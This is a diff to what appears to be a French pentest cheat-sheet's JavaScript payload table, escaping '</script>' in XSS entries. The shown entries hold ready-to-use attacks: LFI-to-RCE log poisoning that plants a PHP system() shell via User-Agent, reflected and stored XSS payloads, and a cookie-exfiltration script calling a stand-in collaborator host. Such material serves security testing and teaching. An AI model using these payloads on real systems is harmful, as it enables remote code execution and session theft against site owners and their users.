@@ -165,9 +165,9 @@ lfi:[
  {t:"LFI → RCE (log poisoning)", c:`# 1) injecter du PHP dans un log via User-Agent\ncurl -s -A "<?php system(\\$_GET[c]); ?>" ${U}/\n# 2) inclure le log\ncurl -s "${U}/?${P}=/var/log/apache2/access.log&c=id"`, e:`Transforme la LFI en exécution de commande.`}
 ],
 xss:[
- {t:"XSS réfléchie", c:`# ouvre dans le navigateur :\n${U}/?${P}=<script>alert(document.domain)</script>\n${U}/?${P}="><img src=x onerror=alert(1)>`, e:`Popup = XSS. Adapte au contexte (attribut, JS, HTML). Teste l'encodage.`},
+ {t:"XSS réfléchie", c:`# ouvre dans le navigateur :\n${U}/?${P}=<script>alert(document.domain)<\/script>\n${U}/?${P}="><img src=x onerror=alert(1)>`, e:`Popup = XSS. Adapte au contexte (attribut, JS, HTML). Teste l'encodage.`},
  {t:"XSS stockée", c:`# injecte dans un champ persistant (profil, commentaire, nom) :\n"><svg onload=alert(document.domain)>`, e:`Si ça s'exécute chez un AUTRE utilisateur (ou au rechargement) → stockée = plus grave.`},
- {t:"Preuve d'impact (vol de session)", c:`# PoC non destructif : montrer document.cookie côté attaquant\n<script>new Image().src='//TON-COLLABORATOR/?c='+document.cookie</script>`, e:`Démontre l'impact réel (exfiltration de session) sans nuire aux utilisateurs.`}
+ {t:"Preuve d'impact (vol de session)", c:`# PoC non destructif : montrer document.cookie côté attaquant\n<script>new Image().src='//TON-COLLABORATOR/?c='+document.cookie<\/script>`, e:`Démontre l'impact réel (exfiltration de session) sans nuire aux utilisateurs.`}
 ],
 idor:[
  {t:"Repérer un identifiant", c:`# connecté au COMPTE A, note un ID d'objet (facture, message, RDV)\ncurl -s -b "cookieA" "${U}/api/object/1001"`, e:`ID séquentiel = candidat parfait. UUID = tester quand même (parfois devinables/leakés).`},
